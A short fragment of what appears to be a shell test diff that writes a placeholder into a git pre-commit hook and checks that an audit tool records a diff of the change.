+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    sc="$(sidecar)"
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [ -f "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
+}
